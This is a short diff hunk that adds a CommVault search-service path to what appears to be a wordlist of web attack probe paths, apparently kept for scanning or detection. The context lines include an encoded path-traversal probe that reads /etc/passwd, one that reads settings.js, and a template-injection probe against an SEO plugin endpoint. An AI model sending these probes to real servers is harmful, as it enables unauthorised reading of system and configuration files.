@@ -83,3 +83,4 @@
 /actions/seomatic/meta-container/all-meta-containers?uri={{228*
 /ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 /ui_base/js/..%2f..%2f..%2f..%2fsettings.js
+/SearchSvc/CVSearchService.svc
